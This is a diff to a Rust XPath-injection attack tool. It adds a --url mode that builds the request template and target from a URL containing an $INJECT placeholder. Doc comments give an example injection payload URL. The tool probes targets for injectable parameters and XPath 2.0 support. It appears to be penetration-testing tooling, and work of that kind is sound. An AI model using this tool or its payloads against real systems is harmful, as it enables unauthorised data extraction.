@@ -41,18 +41,25 @@ struct Args {
     use_ssl: bool,
 
     /// File containing sample request with $INJECT as dynamic injection location
-    #[arg(short = 'i', long = "inject", required = true)]
-    inject_file: String,
+    /// (required unless --url is given)
+    #[arg(short = 'i', long = "inject")]
+    inject_file: Option<String>,
 
     /// Keyword that is present on a successful injection response
     #[arg(short = 'm', long = "match", required = true)]
     match_pattern: String,
 
-    /// Target host
-    host: String,
+    /// Target host (required unless --url is given)
+    host: Option<String>,
 
-    /// Target port
-    port: u16,
+    /// Target port (required unless --url is given)
+    port: Option<u16>,
+
+    /// Full URL with $INJECT in the parameter to attack.
+    /// Host, port, SSL, and the request template are all derived automatically.
+    /// Example: "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search"
+    #[arg(long = "url", conflicts_with_all = ["inject_file", "host", "port", "use_ssl"])]
+    url: Option<String>,
 
     // --- Test options ---
     /// Test injection with a single example payload and show full request/response
@@ -157,13 +164,46 @@ fn main() {
     let t1 = Instant::now();
     let args = Args::parse();
 
-    // Read inject file
-    let inject_content = match fs::read_to_string(&args.inject_file) {
-        Ok(c) => c,
-        Err(e) => {
-            eprintln!("Error: Cannot access injection file: {}", e);
-            std::process::exit(2);
+    // Build inject_content, host, port, and ssl from either --url or --inject + positional args
+    let (inject_content, host, port, use_ssl) = if let Some(ref raw_url) = args.url {
+        match build_from_url(raw_url) {
+            Ok(v) => v,
+            Err(e) => {
+                eprintln!("Error: Could not parse --url: {}", e);
+                std::process::exit(2);
+            }
         }
+    } else {
+        // Require --inject, host, port in traditional mode
+        let inject_file = match args.inject_file.as_deref() {
+            Some(f) => f,
+            None => {
+                eprintln!("Error: either --url or --inject + host + port are required");
+                std::process::exit(2);
+            }
+        };
+        let content = match fs::read_to_string(inject_file) {
+            Ok(c) => c,
+            Err(e) => {
+                eprintln!("Error: Cannot access injection file: {}", e);
+                std::process::exit(2);
+            }
+        };
+        let host = match args.host.clone() {
+            Some(h) => h,
+            None => {
+                eprintln!("Error: host is required when not using --url");
+                std::process::exit(2);
+            }
+        };
+        let port = match args.port {
+            Some(p) => p,
+            None => {
+                eprintln!("Error: port is required when not using --url");
+                std::process::exit(2);
+            }
+        };
+        (content, host, port, args.use_ssl)
     };
 
     // Verify $INJECT placeholder is present
@@ -242,11 +282,11 @@ fn main() {
         case_sensitive: args.case_sensitive,
         urlencode: args.urlencode,
         htmlencode: args.htmlencode,
-        use_ssl: args.use_ssl,
+        use_ssl,
         inject_content,
         match_pattern: args.match_pattern.clone(),
-        host: args.host.clone(),
-        port: args.port,
+        host,
+        port,
         verbose_attack: args.example.is_some(),
         summary: args.summary,
         no_root: args.no_root,
@@ -341,7 +381,7 @@ fn main() {
         if attack(&encode_payload("lower-case('A')='a'", &ctx.config), &ctx) {
             eprintln!(
                 "### Looks like {}:{} supports XPath 2.0 injection via lower-case(), consider using xcat ###",
-                args.host, args.port
+                ctx.config.host, ctx.config.port
             );
             std::process::exit(8);
         }
@@ -441,6 +481,54 @@ fn print_stats(ctx: &Arc<AttackCtx>, t1: Instant) {
         elapsed,
         count as f64 / elapsed
     );
+}
+
+/// Parse a URL containing $INJECT and return (inject_content, host, port, use_ssl).
+///
+/// The URL must contain `$INJECT` somewhere in the query string (or path).
+/// SSL is inferred from the scheme. Port defaults to 80/443 per scheme.
+///
+/// Example:
+///   `http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search`
+fn build_from_url(raw: &str) -> Result<(String, String, u16, bool), String> {
+    use ::url::Url;
+
+    let parsed = Url::parse(raw).map_err(|e| format!("invalid URL: {}", e))?;
+
+    let scheme = parsed.scheme();
+    let use_ssl = match scheme {
+        "https" => true,
+        "http" => false,
+        other => return Err(format!("unsupported scheme '{}', use http or https", other)),
+    };
+
+    let host = parsed
+        .host_str()
+        .ok_or("URL has no host")?
+        .to_string();
+
+    let port = parsed
+        .port_or_known_default()
+        .ok_or("could not determine port from URL")?;
+
+    // Reconstruct path + query, preserving $INJECT verbatim.
+    // Url::parse percent-encodes $INJECT, so we work on the raw string instead.
+    let after_authority = raw
+        .find(&format!("{}:{}", scheme, "//"))
+        .map(|_| {
+            // skip "scheme://"
+            let rest = &raw[scheme.len() + 3..];
+            // skip the authority (host:port)
+            rest.find('/').map(|p| &rest[p..]).unwrap_or("/")
+        })
+        .unwrap_or("/");
+
+    let request = format!(
+        "GET {} HTTP/1.1\r\nHost: {}\r\n\r\n",
+        after_authority, host
+    );
+
+    Ok((request, host, port, use_ssl))
 }
 
 /// Minimal XML pretty-printer using Rust's standard library XML parser.
